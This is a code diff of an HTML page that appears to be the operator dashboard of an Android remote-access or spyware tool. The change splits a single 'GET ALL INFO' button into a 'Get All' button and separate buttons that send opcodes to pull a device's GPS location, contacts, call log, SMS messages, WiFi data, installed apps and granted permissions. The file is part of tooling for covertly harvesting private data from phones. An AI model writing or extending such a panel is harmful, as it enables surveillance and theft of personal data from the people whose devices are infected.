@@ -23,7 +23,7 @@
         <div class="statistic"></div>
     </div>
     -->
-    
+
     <script>
         function getAllInfo() {
             updateButton(this, '0xLO'); // GPS
@@ -35,7 +35,17 @@
             updateButton(this, '0xPM'); // Allowed Permissions
         }
     </script>
-    <button onclick="getAllInfo();">GET ALL INFO</button>
-    <p> GPS, Contacts, Call Log, SMS, WiFi, Installed Apps, Allowed Permissions
+    <button class="bigbutton" onclick="getAllInfo();">Get All</button>
+    <br>
+    <button onclick="updateButton(this, '0xLO');">GPS</button>
+    <button onclick="updateButton(this, '0xCO');">Contacts</button>
+    <button onclick="updateButton(this, '0xCL');">Call Log</button>
+    <button onclick="updateButton(this, '0xSM', {'action': 'ls'});">SMS</button>
+    <button onclick="updateButton(this, '0xWI');">WiFi</button>
+    <button onclick="updateButton(this, '0xIN');">Installed Apps</button>
+    <button onclick="updateButton(this, '0xPM');">Allowed Permissions</button>
+    <!--
+        <p> GPS, Contacts, Call Log, SMS, WiFi, Installed Apps, Allowed Permissions
+    -->
     </p>
 </div>
